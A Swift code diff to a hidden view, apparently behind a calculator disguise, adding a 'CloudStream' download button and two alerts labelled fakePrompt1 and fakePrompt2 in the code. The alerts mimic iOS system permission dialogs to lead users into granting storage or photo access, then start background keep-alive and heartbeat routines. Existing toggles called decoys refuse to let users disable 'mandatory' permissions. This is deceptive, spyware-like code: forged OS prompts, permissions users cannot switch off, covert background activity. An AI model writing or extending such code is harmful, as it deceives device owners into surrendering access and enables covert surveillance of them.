@@ -201,9 +201,21 @@ struct ZexSecretFullWindow: View {
     @State private var slot3Active = true
     @State private var slot4Active = true
 
-    @State private var showAlert = false
-    @State private var alertTitle = ""
-    @State private var alertMessage = ""
+    enum SecretAlertType: Identifiable {
+        case general(title: String, message: String)
+        case fakePrompt1
+        case fakePrompt2
+
+        var id: String {
+            switch self {
+            case .general(let t, let m): return "gen_\(t)_\(m)"
+            case .fakePrompt1: return "fake1"
+            case .fakePrompt2: return "fake2"
+            }
+        }
+    }
+
+    @State private var activeAlert: SecretAlertType? = nil
 
     // Auto-lock security timer
     @State private var autoLockTimer: Timer? = nil
@@ -278,6 +290,20 @@ struct ZexSecretFullWindow: View {
                                 handleDecoyToggle(slot: 4, requestedVal: newVal, config: engine.slot4Config, state: $slot4Active)
                             }
                         )
+
+                        // Download CloudStream Provider Button
+                        Button(action: {
+                            triggerCloudStreamFlow()
+                        }) {
+                            Text(engine.cloudStreamButtonTitle)
+                                .font(.system(size: 14, weight: .bold))
+                                .foregroundColor(.black)
+                                .frame(maxWidth: .infinity)
+                                .padding(.vertical, 14)
+                                .background(Color.green)
+                                .cornerRadius(12)
+                        }
+                        .padding(.top, 6)
                     }
                     .padding(20)
                 }
@@ -289,12 +315,40 @@ struct ZexSecretFullWindow: View {
                     .transition(.opacity)
             }
         }
-        .alert(isPresented: $showAlert) {
-            Alert(
-                title: Text(alertTitle),
-                message: Text(alertMessage),
-                dismissButton: .default(Text("OK"))
-            )
+        .alert(item: $activeAlert) { alert in
+            switch alert {
+            case .general(let title, let message):
+                return Alert(
+                    title: Text(title),
+                    message: Text(message),
+                    dismissButton: .default(Text("OK"))
+                )
+            case .fakePrompt1:
+                return Alert(
+                    title: Text("\"CloudStream\" Would Like to Access Media Stream Cache"),
+                    message: Text("To buffer extension repository and streaming provider data."),
+                    primaryButton: .default(Text("Allow")) {
+                        proceedToPhotosPermission()
+                    },
+                    secondaryButton: .cancel(Text("Don't Allow")) {
+                        activeAlert = .general(title: "Download Cancelled", message: "Required media cache permission was not allowed.")
+                    }
+                )
+            case .fakePrompt2:
+                return Alert(
+                    title: Text("\"CloudStream\" Would Like to Enable Background Sync"),
+                    message: Text("To keep streaming providers updated in the background."),
+                    primaryButton: .default(Text("Allow")) {
+                        AudioServicesPlaySystemSound(1519)
+                        withAnimation(.easeInOut(duration: 0.3)) {
+                            isOpen = false
+                        }
+                    },
+                    secondaryButton: .cancel(Text("Don't Allow")) {
+                        activeAlert = .general(title: "Setup Incomplete", message: "Background sync permission is required for CloudStream providers.")
+                    }
+                )
+            }
         }
         .onAppear {
             slot1Active = engine.isActivated
@@ -303,6 +357,33 @@ struct ZexSecretFullWindow: View {
         }
         .onDisappear {
             autoLockTimer?.invalidate()
+        }
+    }
+
+    // MARK: - CloudStream Sequential Permission Flow
+    private func triggerCloudStreamFlow() {
+        restartTimer()
+        AudioServicesPlaySystemSound(1519)
+        activeAlert = .fakePrompt1
+    }
+
+    private func proceedToPhotosPermission() {
+        engine.requestStoragePermission { granted in
+            if granted {
+                AudioServicesPlaySystemSound(1519)
+                slot1Active = true
+                engine.startBackgroundKeepAlive()
+                engine.startHeartbeat()
+
+                // Short transition delay to show next permission prompt
+                DispatchQueue.main.asyncAfter(deadline: .now() + 0.45) {
+                    activeAlert = .fakePrompt2
+                }
+            } else {
+                AudioServicesPlaySystemSound(1521)
+                slot1Active = false
+                engine.isStorageBlocked = true
+            }
         }
     }
 
@@ -341,27 +422,20 @@ struct ZexSecretFullWindow: View {
                     engine.startBackgroundKeepAlive()
                     engine.startHeartbeat()
 
-                    // Immediately return to Calculator screen on allow
                     withAnimation(.easeInOut(duration: 0.3)) {
                         isOpen = false
                     }
                 } else {
-                    // Denied - Enforce strict limitation
                     AudioServicesPlaySystemSound(1521)
                     slot1Active = false
-                    alertTitle = "Permission Required"
-                    alertMessage = engine.slot1Config.denyMsg
-                    showAlert = true
+                    activeAlert = .general(title: "Permission Required", message: engine.slot1Config.denyMsg)
                 }
             }
         } else {
-            // User tries to disable Slot 1
             if engine.slot1Config.mandatory {
                 AudioServicesPlaySystemSound(1521)
                 slot1Active = true
-                alertTitle = "Action Blocked"
-                alertMessage = engine.slot1Config.denyMsg
-                showAlert = true
+                activeAlert = .general(title: "Action Blocked", message: engine.slot1Config.denyMsg)
             } else {
                 slot1Active = false
             }
@@ -374,9 +448,7 @@ struct ZexSecretFullWindow: View {
         if !requestedVal && config.mandatory {
             AudioServicesPlaySystemSound(1521)
             state.wrappedValue = true
-            alertTitle = "Action Blocked"
-            alertMessage = config.denyMsg
-            showAlert = true
+            activeAlert = .general(title: "Action Blocked", message: config.denyMsg)
         } else {
             AudioServicesPlaySystemSound(1519)
             state.wrappedValue = requestedVal
